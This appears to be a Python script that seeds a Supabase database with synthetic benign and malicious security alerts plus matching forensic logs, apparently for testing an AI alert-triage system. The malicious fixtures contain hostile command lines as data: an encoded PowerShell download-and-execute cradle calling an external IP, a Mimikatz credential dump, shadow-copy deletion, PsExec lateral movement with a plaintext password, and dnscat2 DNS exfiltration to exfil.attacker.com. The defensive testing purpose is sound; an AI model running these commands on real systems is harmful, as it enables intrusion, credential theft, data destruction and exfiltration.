#!/usr/bin/env python3
"""
Seed Test Alerts with Associated Forensic Logs
===============================================

This script creates alerts AND their associated forensic logs so the AI
has real evidence to analyze.

Log Types:
- process_logs: Process execution events
- network_logs: Network connections
- file_activity_logs: File system changes
- windows_event_logs: Windows security events

Usage:
    python scripts/seed_test_logs.py --benign    # Seed benign alerts with logs
    python scripts/seed_test_logs.py --malicious # Seed malicious alerts with logs
    python scripts/seed_test_logs.py --all       # Seed both
"""

import os
import sys
import uuid
import random
from datetime import datetime, timedelta

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dotenv import load_dotenv
load_dotenv()

from supabase import create_client

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)


def generate_timestamp(minutes_ago=0):
    """Generate ISO timestamp"""
    return (datetime.utcnow() - timedelta(minutes=minutes_ago)).isoformat() + "Z"


# =============================================================================
# BENIGN ALERT + LOGS TEMPLATES
# =============================================================================

BENIGN_TEST_CASES = [
    {
        "alert": {
            "alert_name": "Windows Update Service Started",
            "severity": "low",
            "description": "Windows Update service wuauserv started as scheduled",
            "source_ip": "10.0.0.50",
            "dest_ip": "10.0.0.1",
            "hostname": "IT-WORKSTATION-001",
            "username": "SYSTEM",
        },
        "process_logs": [
            {
                "process_name": "svchost.exe",
                "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
                "parent_process": "services.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 4532,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
            {
                "process_name": "TiWorker.exe",
                "command_line": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack\\TiWorker.exe",
                "parent_process": "svchost.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 5128,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.50",
                "source_port": 49721,
                "dest_ip": "20.190.163.18",  # Microsoft Update
                "dest_port": 443,
                "protocol": "TCP",
                "bytes_sent": 2048,
                "bytes_received": 156000,
                "domain": "download.windowsupdate.com",
            },
        ],
        "file_logs": [
            {
                "action": "CREATE",
                "file_path": "C:\\Windows\\SoftwareDistribution\\Download\\abc123.cab",
                "process_name": "svchost.exe",
                "file_size": 45000,
            },
        ],
        "windows_logs": [
            {
                "event_id": 7036,
                "event_type": "SERVICE_CONTROL_MANAGER",
                "source": "Service Control Manager",
                "message": "The Windows Update service entered the running state.",
                "level": "Information",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "Scheduled Backup Job Completed",
            "severity": "low",
            "description": "Nightly backup job started as scheduled at 2 AM by Veeam",
            "source_ip": "10.0.0.200",
            "dest_ip": "10.0.0.250",
            "hostname": "BACKUP-SERVER-001",
            "username": "SYSTEM",
        },
        "process_logs": [
            {
                "process_name": "Veeam.Backup.Service.exe",
                "command_line": "C:\\Program Files\\Veeam\\Backup and Replication\\Backup\\Veeam.Backup.Service.exe",
                "parent_process": "services.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 2340,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Veeam Software Group GmbH",
            },
            {
                "process_name": "Veeam.Backup.Agent.exe",
                "command_line": "C:\\Program Files\\Veeam\\Backup and Replication\\Backup\\Veeam.Backup.Agent.exe /job:DailyBackup",
                "parent_process": "Veeam.Backup.Service.exe",
                "user": "DOMAIN\\backup_svc",
                "pid": 6721,
                "integrity_level": "High",
                "is_signed": True,
                "signer": "Veeam Software Group GmbH",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.200",
                "source_port": 49800,
                "dest_ip": "10.0.0.250",
                "dest_port": 445,
                "protocol": "TCP",
                "bytes_sent": 5242880000,  # 5GB backup
                "bytes_received": 1024,
                "domain": "nas-storage.corp.local",
            },
        ],
        "file_logs": [
            {
                "action": "CREATE",
                "file_path": "D:\\Backups\\Daily\\backup_2026-01-27.vbk",
                "process_name": "Veeam.Backup.Agent.exe",
                "file_size": 5242880000,
            },
        ],
        "windows_logs": [
            {
                "event_id": 4624,
                "event_type": "SECURITY",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "An account was successfully logged on. Subject: DOMAIN\\backup_svc",
                "level": "Information",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "IT Admin RDP Session",
            "severity": "medium",
            "description": "IT helpdesk connected via RDP to assist user with printer issue",
            "source_ip": "10.0.0.5",
            "dest_ip": "10.0.0.90",
            "hostname": "IT-HELPDESK-001",
            "username": "helpdesk.admin",
        },
        "process_logs": [
            {
                "process_name": "mstsc.exe",
                "command_line": "C:\\Windows\\System32\\mstsc.exe /v:HR-LAPTOP-003",
                "parent_process": "explorer.exe",
                "user": "DOMAIN\\helpdesk.admin",
                "pid": 8912,
                "integrity_level": "Medium",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
            {
                "process_name": "rdpclip.exe",
                "command_line": "C:\\Windows\\System32\\rdpclip.exe",
                "parent_process": "svchost.exe",
                "user": "DOMAIN\\helpdesk.admin",
                "pid": 4521,
                "integrity_level": "Medium",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.5",
                "source_port": 52341,
                "dest_ip": "10.0.0.90",
                "dest_port": 3389,
                "protocol": "TCP",
                "bytes_sent": 250000,
                "bytes_received": 1500000,
                "domain": "HR-LAPTOP-003.corp.local",
            },
        ],
        "file_logs": [],
        "windows_logs": [
            {
                "event_id": 4624,
                "event_type": "SECURITY",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "An account was successfully logged on. Logon Type: 10 (RemoteInteractive). Account: helpdesk.admin",
                "level": "Information",
            },
            {
                "event_id": 21,
                "event_type": "TERMINAL_SERVICES",
                "source": "Microsoft-Windows-TerminalServices-LocalSessionManager",
                "message": "Remote Desktop Services: Session logon succeeded. User: DOMAIN\\helpdesk.admin",
                "level": "Information",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "Chrome Auto-Update",
            "severity": "low",
            "description": "Google Chrome browser updated automatically to latest version",
            "source_ip": "10.0.0.75",
            "dest_ip": "142.250.80.46",
            "hostname": "SALES-PC-005",
            "username": "SYSTEM",
        },
        "process_logs": [
            {
                "process_name": "GoogleUpdate.exe",
                "command_line": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler",
                "parent_process": "svchost.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 3421,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Google LLC",
            },
            {
                "process_name": "setup.exe",
                "command_line": "C:\\Program Files (x86)\\Google\\Update\\Install\\{guid}\\setup.exe --install --system-level",
                "parent_process": "GoogleUpdate.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 5678,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Google LLC",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.75",
                "source_port": 51234,
                "dest_ip": "142.250.80.46",
                "dest_port": 443,
                "protocol": "TCP",
                "bytes_sent": 4096,
                "bytes_received": 85000000,
                "domain": "dl.google.com",
            },
        ],
        "file_logs": [
            {
                "action": "MODIFY",
                "file_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "process_name": "setup.exe",
                "file_size": 2850000,
            },
        ],
        "windows_logs": [
            {
                "event_id": 11707,
                "event_type": "MsiInstaller",
                "source": "MsiInstaller",
                "message": "Product: Google Chrome -- Installation operation completed successfully.",
                "level": "Information",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "Antivirus Scan Completed",
            "severity": "low",
            "description": "Windows Defender completed scheduled full scan - no threats found",
            "source_ip": "10.0.0.60",
            "dest_ip": "10.0.0.1",
            "hostname": "FINANCE-WS-002",
            "username": "SYSTEM",
        },
        "process_logs": [
            {
                "process_name": "MsMpEng.exe",
                "command_line": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2301.6\\MsMpEng.exe",
                "parent_process": "services.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 2980,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Microsoft Corporation",
            },
            {
                "process_name": "MpCmdRun.exe",
                "command_line": "MpCmdRun.exe -Scan -ScanType 2",
                "parent_process": "MsMpEng.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 7654,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Microsoft Corporation",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.60",
                "source_port": 49512,
                "dest_ip": "20.190.163.18",
                "dest_port": 443,
                "protocol": "TCP",
                "bytes_sent": 8192,
                "bytes_received": 524288,
                "domain": "definitionupdates.microsoft.com",
            },
        ],
        "file_logs": [
            {
                "action": "READ",
                "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "process_name": "MsMpEng.exe",
                "file_size": 824,
            },
        ],
        "windows_logs": [
            {
                "event_id": 1001,
                "event_type": "Windows Defender",
                "source": "Microsoft-Windows-Windows Defender",
                "message": "Windows Defender Antivirus scan has finished. Scan Type: Full scan. Scan Results: No threats were detected.",
                "level": "Information",
            },
        ],
    },
]

# =============================================================================
# MALICIOUS ALERT + LOGS TEMPLATES
# =============================================================================

MALICIOUS_TEST_CASES = [
    {
        "alert": {
            "alert_name": "PowerShell Download Cradle - Possible Malware",
            "severity": "critical",
            "description": "PowerShell executed encoded command downloading from suspicious external IP",
            "source_ip": "10.20.1.45",
            "dest_ip": "185.220.101.45",
            "hostname": "FINANCE-WS-001",
            "username": "john.doe",
            "mitre_technique": "T1059.001",
        },
        "process_logs": [
            {
                "process_name": "WINWORD.EXE",
                "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\Invoice_Q4_2025.docm\"",
                "parent_process": "explorer.exe",
                "user": "DOMAIN\\john.doe",
                "pid": 8456,
                "integrity_level": "Medium",
                "is_signed": True,
                "signer": "Microsoft Corporation",
            },
            {
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApACkA",
                "parent_process": "WINWORD.EXE",
                "user": "DOMAIN\\john.doe",
                "pid": 9234,
                "integrity_level": "Medium",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
            {
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -ep bypass -file C:\\Users\\john.doe\\AppData\\Local\\Temp\\payload.ps1",
                "parent_process": "powershell.exe",
                "user": "DOMAIN\\john.doe",
                "pid": 9456,
                "integrity_level": "Medium",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.20.1.45",
                "source_port": 52341,
                "dest_ip": "185.220.101.45",
                "dest_port": 80,
                "protocol": "TCP",
                "bytes_sent": 512,
                "bytes_received": 45000,
                "domain": "185.220.101.45",  # Raw IP - suspicious
            },
            {
                "source_ip": "10.20.1.45",
                "source_port": 52400,
                "dest_ip": "185.220.101.45",
                "dest_port": 443,
                "protocol": "TCP",
                "bytes_sent": 8192,
                "bytes_received": 0,
                "domain": "185.220.101.45",
            },
        ],
        "file_logs": [
            {
                "action": "CREATE",
                "file_path": "C:\\Users\\john.doe\\AppData\\Local\\Temp\\payload.ps1",
                "process_name": "powershell.exe",
                "file_size": 45000,
            },
            {
                "action": "CREATE",
                "file_path": "C:\\Users\\john.doe\\AppData\\Roaming\\Microsoft\\svchost.exe",
                "process_name": "powershell.exe",
                "file_size": 892000,
            },
        ],
        "windows_logs": [
            {
                "event_id": 4688,
                "event_type": "SECURITY",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "A new process has been created. Creator Process: WINWORD.EXE, New Process: powershell.exe, Command Line: powershell.exe -nop -w hidden -enc ...",
                "level": "Information",
            },
            {
                "event_id": 4104,
                "event_type": "PowerShell",
                "source": "Microsoft-Windows-PowerShell",
                "message": "Script block logging: IEX ((new-object net.webclient).downloadstring('http://185.220.101.45/payload.ps1'))",
                "level": "Warning",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "Mimikatz Credential Dumping Detected",
            "severity": "critical",
            "description": "Mimikatz tool detected attempting to dump credentials from LSASS",
            "source_ip": "10.0.0.150",
            "dest_ip": "10.0.0.1",
            "hostname": "COMPROMISED-PC-001",
            "username": "attacker",
            "mitre_technique": "T1003.001",
        },
        "process_logs": [
            {
                "process_name": "cmd.exe",
                "command_line": "cmd.exe /c mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                "parent_process": "explorer.exe",
                "user": "DOMAIN\\attacker",
                "pid": 6789,
                "integrity_level": "High",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
            {
                "process_name": "mimikatz.exe",
                "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                "parent_process": "cmd.exe",
                "user": "DOMAIN\\attacker",
                "pid": 7890,
                "integrity_level": "High",
                "is_signed": False,
                "signer": None,
            },
        ],
        "network_logs": [],  # Local attack - no network
        "file_logs": [
            {
                "action": "CREATE",
                "file_path": "C:\\Users\\attacker\\Desktop\\mimikatz.exe",
                "process_name": "chrome.exe",
                "file_size": 1250000,
            },
            {
                "action": "CREATE",
                "file_path": "C:\\Users\\attacker\\Desktop\\creds.txt",
                "process_name": "mimikatz.exe",
                "file_size": 15000,
            },
        ],
        "windows_logs": [
            {
                "event_id": 4688,
                "event_type": "SECURITY",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "A new process has been created. Process Name: mimikatz.exe, Token Elevation Type: Full Token (Administrator)",
                "level": "Information",
            },
            {
                "event_id": 10,
                "event_type": "Sysmon",
                "source": "Microsoft-Windows-Sysmon",
                "message": "Process accessed LSASS. SourceImage: C:\\Users\\attacker\\Desktop\\mimikatz.exe TargetImage: C:\\Windows\\System32\\lsass.exe GrantedAccess: 0x1010",
                "level": "Warning",
            },
            {
                "event_id": 4672,
                "event_type": "SECURITY",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "Special privileges assigned to new logon. Privileges: SeDebugPrivilege",
                "level": "Information",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "Ransomware File Encryption Pattern",
            "severity": "critical",
            "description": "Mass file encryption detected - files being renamed to .locked extension",
            "source_ip": "10.0.0.99",
            "dest_ip": "10.0.0.200",
            "hostname": "ACCOUNTING-WS-002",
            "username": "ransomware.exe",
            "mitre_technique": "T1486",
        },
        "process_logs": [
            {
                "process_name": "ransomware.exe",
                "command_line": "C:\\Users\\Public\\ransomware.exe --encrypt --key=abc123 --ext=.locked",
                "parent_process": "explorer.exe",
                "user": "DOMAIN\\finance.user",
                "pid": 4567,
                "integrity_level": "Medium",
                "is_signed": False,
                "signer": None,
            },
            {
                "process_name": "vssadmin.exe",
                "command_line": "vssadmin.exe delete shadows /all /quiet",
                "parent_process": "ransomware.exe",
                "user": "DOMAIN\\finance.user",
                "pid": 5678,
                "integrity_level": "High",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
            {
                "process_name": "wmic.exe",
                "command_line": "wmic shadowcopy delete",
                "parent_process": "ransomware.exe",
                "user": "DOMAIN\\finance.user",
                "pid": 5890,
                "integrity_level": "High",
                "is_signed": True,
                "signer": "Microsoft Windows",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.99",
                "source_port": 49000,
                "dest_ip": "185.141.25.68",
                "dest_port": 443,
                "protocol": "TCP",
                "bytes_sent": 2048,
                "bytes_received": 512,
                "domain": "payment.ransom-gang.onion",  # TOR
            },
        ],
        "file_logs": [
            {
                "action": "RENAME",
                "file_path": "C:\\Users\\finance.user\\Documents\\Q4_Budget.xlsx.locked",
                "process_name": "ransomware.exe",
                "file_size": 125000,
            },
            {
                "action": "RENAME",
                "file_path": "C:\\Users\\finance.user\\Documents\\Payroll_2026.xlsx.locked",
                "process_name": "ransomware.exe",
                "file_size": 450000,
            },
            {
                "action": "RENAME",
                "file_path": "C:\\Users\\finance.user\\Documents\\Contracts\\Vendor_NDA.docx.locked",
                "process_name": "ransomware.exe",
                "file_size": 85000,
            },
            {
                "action": "CREATE",
                "file_path": "C:\\Users\\finance.user\\Desktop\\README_DECRYPT.txt",
                "process_name": "ransomware.exe",
                "file_size": 2500,
            },
        ],
        "windows_logs": [
            {
                "event_id": 4688,
                "event_type": "SECURITY",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "A new process has been created. Process Name: vssadmin.exe, Command Line: delete shadows /all /quiet",
                "level": "Warning",
            },
            {
                "event_id": 1,
                "event_type": "Sysmon",
                "source": "Microsoft-Windows-Sysmon",
                "message": "File created: TargetFilename: C:\\Users\\finance.user\\Desktop\\README_DECRYPT.txt",
                "level": "Information",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "Lateral Movement - PsExec Detected",
            "severity": "high",
            "description": "PsExec used to execute commands on remote system",
            "source_ip": "10.0.0.50",
            "dest_ip": "10.0.0.100",
            "hostname": "INFECTED-PC-001",
            "username": "admin",
            "mitre_technique": "T1570",
        },
        "process_logs": [
            {
                "process_name": "psexec.exe",
                "command_line": "psexec.exe \\\\10.0.0.100 -u admin -p password123 cmd.exe",
                "parent_process": "cmd.exe",
                "user": "DOMAIN\\admin",
                "pid": 3456,
                "integrity_level": "High",
                "is_signed": True,
                "signer": "Microsoft Corporation",  # Sysinternals
            },
            {
                "process_name": "PSEXESVC.exe",
                "command_line": "PSEXESVC.exe",
                "parent_process": "services.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "pid": 4567,
                "integrity_level": "System",
                "is_signed": True,
                "signer": "Microsoft Corporation",
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.50",
                "source_port": 49500,
                "dest_ip": "10.0.0.100",
                "dest_port": 445,
                "protocol": "TCP",
                "bytes_sent": 125000,
                "bytes_received": 8192,
                "domain": "TARGET-SERVER.corp.local",
            },
            {
                "source_ip": "10.0.0.50",
                "source_port": 49501,
                "dest_ip": "10.0.0.100",
                "dest_port": 135,
                "protocol": "TCP",
                "bytes_sent": 2048,
                "bytes_received": 1024,
                "domain": "TARGET-SERVER.corp.local",
            },
        ],
        "file_logs": [
            {
                "action": "CREATE",
                "file_path": "C:\\Windows\\PSEXESVC.exe",
                "process_name": "psexec.exe",
                "file_size": 145000,
            },
        ],
        "windows_logs": [
            {
                "event_id": 7045,
                "event_type": "SYSTEM",
                "source": "Service Control Manager",
                "message": "A service was installed in the system. Service Name: PSEXESVC",
                "level": "Information",
            },
            {
                "event_id": 4624,
                "event_type": "SECURITY",
                "source": "Microsoft-Windows-Security-Auditing",
                "message": "An account was successfully logged on. Logon Type: 3 (Network). Account: admin. Source Network Address: 10.0.0.50",
                "level": "Information",
            },
        ],
    },
    {
        "alert": {
            "alert_name": "Data Exfiltration via DNS Tunneling",
            "severity": "high",
            "description": "Large encoded DNS queries to suspicious domain detected",
            "source_ip": "10.0.0.120",
            "dest_ip": "23.129.64.10",
            "hostname": "RESEARCH-SERVER-001",
            "username": "SYSTEM",
            "mitre_technique": "T1048.003",
        },
        "process_logs": [
            {
                "process_name": "dnscat2.exe",
                "command_line": "C:\\Users\\Public\\dnscat2.exe --domain exfil.attacker.com",
                "parent_process": "cmd.exe",
                "user": "DOMAIN\\research.user",
                "pid": 8901,
                "integrity_level": "Medium",
                "is_signed": False,
                "signer": None,
            },
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.120",
                "source_port": 55000,
                "dest_ip": "23.129.64.10",
                "dest_port": 53,
                "protocol": "UDP",
                "bytes_sent": 500000,  # Large for DNS
                "bytes_received": 10000,
                "domain": "aGVsbG8td29ybGQ.exfil.attacker.com",  # Base64 subdomain
            },
            {
                "source_ip": "10.0.0.120",
                "source_port": 55001,
                "dest_ip": "23.129.64.10",
                "dest_port": 53,
                "protocol": "UDP",
                "bytes_sent": 480000,
                "bytes_received": 8000,
                "domain": "c2VjcmV0LWRhdGE.exfil.attacker.com",
            },
        ],
        "file_logs": [
            {
                "action": "READ",
                "file_path": "C:\\Research\\Confidential\\Project_X_Plans.docx",
                "process_name": "dnscat2.exe",
                "file_size": 2500000,
            },
            {
                "action": "READ",
                "file_path": "C:\\Research\\Confidential\\Patent_Application.pdf",
                "process_name": "dnscat2.exe",
                "file_size": 5000000,
            },
        ],
        "windows_logs": [
            {
                "event_id": 22,
                "event_type": "Sysmon",
                "source": "Microsoft-Windows-Sysmon",
                "message": "DNS query. ProcessName: dnscat2.exe QueryName: aGVsbG8td29ybGQ.exfil.attacker.com QueryResults: 23.129.64.10",
                "level": "Information",
            },
        ],
    },
]


def seed_alert_with_logs(test_case, is_benign=True):
    """Create an alert and its associated logs"""
    alert_data = test_case["alert"].copy()
    alert_data["created_at"] = generate_timestamp()
    alert_data["status"] = "open"
    alert_data["severity_class"] = "MEDIUM_LOW" if alert_data["severity"] in ["low", "medium"] else "CRITICAL_HIGH"
    
    # Insert alert
    try:
        result = supabase.table("alerts").insert(alert_data).execute()
        alert_id = result.data[0]["id"]
        print(f"  [OK] Alert created: {alert_data['alert_name'][:50]}... (ID: {alert_id[:8]})")
    except Exception as e:
        print(f"  [ERROR] Failed to create alert: {e}")
        return None
    
    timestamp = generate_timestamp()
    
    # Insert process logs
    for log in test_case.get("process_logs", []):
        log_entry = {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "hostname": alert_data.get("hostname"),
            **log
        }
        try:
            supabase.table("process_logs").insert(log_entry).execute()
        except Exception as e:
            print(f"    [WARNING] Process log failed: {e}")
    
    # Insert network logs
    for log in test_case.get("network_logs", []):
        log_entry = {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "hostname": alert_data.get("hostname"),
            **log
        }
        try:
            supabase.table("network_logs").insert(log_entry).execute()
        except Exception as e:
            print(f"    [WARNING] Network log failed: {e}")
    
    # Insert file activity logs
    for log in test_case.get("file_logs", []):
        log_entry = {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "hostname": alert_data.get("hostname"),
            **log
        }
        try:
            supabase.table("file_activity_logs").insert(log_entry).execute()
        except Exception as e:
            print(f"    [WARNING] File log failed: {e}")
    
    # Insert Windows event logs
    for log in test_case.get("windows_logs", []):
        log_entry = {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "hostname": alert_data.get("hostname"),
            **log
        }
        try:
            supabase.table("windows_event_logs").insert(log_entry).execute()
        except Exception as e:
            print(f"    [WARNING] Windows log failed: {e}")
    
    log_counts = {
        "process": len(test_case.get("process_logs", [])),
        "network": len(test_case.get("network_logs", [])),
        "file": len(test_case.get("file_logs", [])),
        "windows": len(test_case.get("windows_logs", [])),
    }
    print(f"    Logs: {log_counts}")
    
    return alert_id


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Seed test alerts with forensic logs")
    parser.add_argument("--benign", action="store_true", help="Seed benign test cases")
    parser.add_argument("--malicious", action="store_true", help="Seed malicious test cases")
    parser.add_argument("--all", action="store_true", help="Seed all test cases")
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("SEED TEST ALERTS WITH FORENSIC LOGS")
    print("="*70)
    
    if args.all or (not args.benign and not args.malicious):
        args.benign = True
        args.malicious = True
    
    if args.benign:
        print("\n[BENIGN TEST CASES]")
        print("-"*70)
        for case in BENIGN_TEST_CASES:
            seed_alert_with_logs(case, is_benign=True)
        print(f"\nSeeded {len(BENIGN_TEST_CASES)} benign alerts with logs")
    
    if args.malicious:
        print("\n[MALICIOUS TEST CASES]")
        print("-"*70)
        for case in MALICIOUS_TEST_CASES:
            seed_alert_with_logs(case, is_benign=False)
        print(f"\nSeeded {len(MALICIOUS_TEST_CASES)} malicious alerts with logs")
    
    print("\n" + "="*70)
    print("SEEDING COMPLETE!")
    print("="*70)
    print("\nThe backend will automatically pick up these alerts for AI analysis.")
    print("Check the Analyst Dashboard to see the AI verdicts.")
    print("="*70)


if __name__ == "__main__":
    main()
